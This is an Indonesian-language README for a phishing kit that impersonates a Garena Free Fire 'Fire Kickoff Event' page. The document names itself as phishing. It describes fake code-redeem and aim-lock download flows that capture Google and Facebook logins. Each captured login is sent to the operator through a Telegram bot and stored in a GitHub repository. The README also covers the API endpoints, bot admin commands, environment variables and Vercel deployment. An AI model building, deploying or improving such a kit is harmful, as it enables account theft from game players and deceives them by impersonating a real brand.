# 🎮 Free Fire — Fire Kickoff Event 2026

Proyek phishing berbasis **Node.js + Express** yang menyamar sebagai halaman event resmi Garena Free Fire. Dirancang untuk mengumpulkan kredensial akun pengguna melalui tiga alur utama, dengan notifikasi real-time via Telegram Bot dan penyimpanan data permanen ke GitHub.

---

## 📁 Struktur Proyek

```
ff-kickoff-event/
├── index.html          # Halaman utama — menu pilihan event (tampilan Garena)
├── coderedem.html      # Alur Code Redeem — klaim hadiah palsu
├── aimlock.html        # Alur Tool FF — download aim lock & auto headshot
├── survey.html         # Kuesioner survei tambahan
├── server.js           # Server Express — API login, webhook Telegram, GitHub DB
├── attached_assets/    # Gambar dari Garena CDN (hero, event, ikon)
├── data/
│   └── settings.json   # Konfigurasi lokal (token Telegram, chat ID)
├── vercel.json         # Konfigurasi deploy Vercel
└── package.json        # Dependensi: express
```

---

## ⚙️ Teknologi

| Komponen       | Detail                                  |
|----------------|-----------------------------------------|
| Runtime        | Node.js 20.x                            |
| Framework      | Express 4.x                             |
| Database       | GitHub Contents API (persistent)        |
| Notifikasi     | Telegram Bot API                        |
| Deploy         | Vercel / Replit                         |
| Enkripsi data  | Base64 via GitHub API                   |

---

## 🔐 Environment Variables

Atur di Replit Secrets atau `.env`:

| Key                   | Keterangan                                        |
|-----------------------|---------------------------------------------------|
| `GITHUB`              | Personal Access Token GitHub (repo write access)  |
| `TELEGRAM_BOT_TOKEN`  | Token bot Telegram dari @BotFather                |
| `TELEGRAM_CHAT_ID`    | Chat ID admin (dari @userinfobot)                 |

> Token dan Chat ID juga bisa diatur lewat endpoint `/api/settings` tanpa restart server.

---

## 🚀 Menjalankan Proyek

```bash
# Install dependensi
npm install

# Jalankan server
node server.js
# → Server berjalan di http://localhost:3000
```

---

## 📡 API Endpoints

| Method | Endpoint              | Fungsi                                          |
|--------|-----------------------|-------------------------------------------------|
| POST   | `/api/login`          | Menerima data login dari halaman web            |
| POST   | `/api/webhook`        | Webhook Telegram untuk admin panel bot          |
| GET    | `/api/settings`       | Ambil konfigurasi Telegram saat ini             |
| POST   | `/api/settings`       | Simpan token & chat ID Telegram                 |
| GET    | `/api/test-tg`        | Tes koneksi Telegram Bot                        |
| GET    | `/api/db-info`        | Info database GitHub (total data, ukuran)       |
| GET    | `/api/data`           | Ambil semua data login (JSON)                   |

---

## 🤖 Perintah Telegram Bot

Kirim ke bot setelah set webhook (`/api/webhook`):

| Perintah         | Fungsi                                     |
|------------------|--------------------------------------------|
| `/start`         | Tampilkan menu utama dengan statistik      |
| `/data`          | Lihat data login terbaru (paginasi 5/hal)  |
| `/stats`         | Statistik lengkap + breakdown per halaman  |
| `/export`        | Export 50 data terbaru dalam teks          |
| `/database`      | Info database GitHub                       |
| `/clear`         | Konfirmasi hapus semua data                |
| `/hapus 5`       | Hapus data nomor 5                         |
| `/hapus 1-50`    | Hapus data nomor 1 sampai 50               |
| `/cari`          | Cari data berdasarkan email/UID            |
| `/info`          | Informasi bot & daftar perintah            |

---

## 🗄️ Database (GitHub)

Data login disimpan di:
```
Repo  : Kztutorial99/FreeFireEvent
File  : data/logins.json
Branch: main
```

- Maksimal **5.000 record** (otomatis trim data terlama)
- Cache in-memory **15 detik** untuk kurangi GitHub API calls
- Tiap login baru memicu commit otomatis ke repo

---

## 🌐 Halaman & Alur

### 1. `index.html` — Landing Menu
Tampilan mirip halaman event resmi Garena. Pengguna memilih antara:
- **Code Redeem** → `/coderedem.html`
- **Tool FF (Aim Lock)** → `/aimlock.html`

### 2. `coderedem.html` — Code Redeem
Alur: Login Google/Facebook → masuk kode redeem → proses palsu → redirect/survey

### 3. `aimlock.html` — Tool FF
Alur: Klik Download → Login Google/Facebook → "file terenkripsi" → survey

### 4. `survey.html` — Kuesioner
Halaman survei 5 pertanyaan sebagai langkah tambahan setelah login

---

## 📦 Deploy ke Vercel

```bash
vercel --prod
```

`vercel.json` sudah dikonfigurasi untuk meneruskan semua request ke `server.js`.

---

## ⚠️ Catatan

- Pastikan token GitHub memiliki scope `repo` (read + write)
- Webhook Telegram harus didaftarkan manual setelah deploy:
  ```
  https://api.telegram.org/bot<TOKEN>/setWebhook?url=https://<domain>/api/webhook
  ```
- File `data/settings.json` menyimpan konfigurasi lokal dan tidak boleh di-commit
